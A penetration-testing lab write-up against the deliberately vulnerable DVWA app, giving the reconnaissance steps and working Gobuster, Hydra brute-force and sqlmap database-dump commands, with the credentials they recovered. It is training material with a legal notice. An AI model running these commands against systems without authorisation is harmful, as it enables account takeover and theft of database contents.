DVWA Penetration Testing Lab – Attack Steps

This document outlines the step-by-step methodology followed during the penetration testing of the DVWA environment.
All examples are sanitized for safe public sharing.

---

# Reconnaissance

1.1 Nmap Scan

Objective: Identify open ports, services, and versions.

📌 Findings:
	•	Port 80 – HTTP – Apache/2.4.62 (Debian)
	•	Port 3306 – MySQL/MariaDB
	•	OS Fingerprint: Linux Debian


1.2 Gobuster Directory Enumeration

Objective: Discover hidden web directories and files.

gobuster dir -u http://<target-ip>/ -w /path/to/wordlist -o attack-scripts/gobuster_scan.txt

📌 Findings:
	•	/dvwa/ – DVWA application root
	•	/dvwa/login.php – Login page
	•	/dvwa/config/ – Config files

# Exploitation

2.1 Brute Force with Hydra

Objective: Test weak credentials on the DVWA login.

hydra -l admin -P /path/to/wordlist http://<target-ip>/dvwa/login.php -V -o attack-scripts/hydra_bruteforce.txt

📌 Result:
	•	Valid credentials found: admin:password

2.2 SQL Injection (SQLMap)

Objective: Exploit DVWA SQL Injection vulnerability to extract database data.

sqlmap -u "http://<target-ip>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session-id>; security=low" \
  --batch --level=5 --risk=3 --dump -o attack-scripts/sqlmap_dump.txt

📌 Result:
	•	Database Name: dvwa
	•	Table Extracted: users
	•	Dumped usernames and hashed passwords (some cracked: admin:password, gordonb:abc123)


#Post-Exploitation

	•	Logged extracted data into attack-scripts/sqlmap_dump.txt
	•	Captured screenshots of SQLMap output and DVWA vulnerable pages (IPs blurred before upload)

#Documentation & Evidence

	•	Configs → configs/dvwa-config.sample.php (sanitized DVWA config file)
	•	Docs → docs/attack-steps.md (this file)
	•	Attack Scripts → All tool output logs stored in attack-scripts/
	•	Screenshots → Stored in /screenshots with IPs and sensitive info blurred

#Lessons Learned

	•	Weak passwords (password, abc123) remain a major risk in web apps.
	•	Input validation failures lead directly to SQL Injection vulnerabilities.
	•	Simple reconnaissance can reveal high-impact vulnerabilities in unpatched systems.

# Legal & Ethical Notice

This lab was executed in a controlled environment.
Testing against systems you do not own or have explicit permission to test is illegal




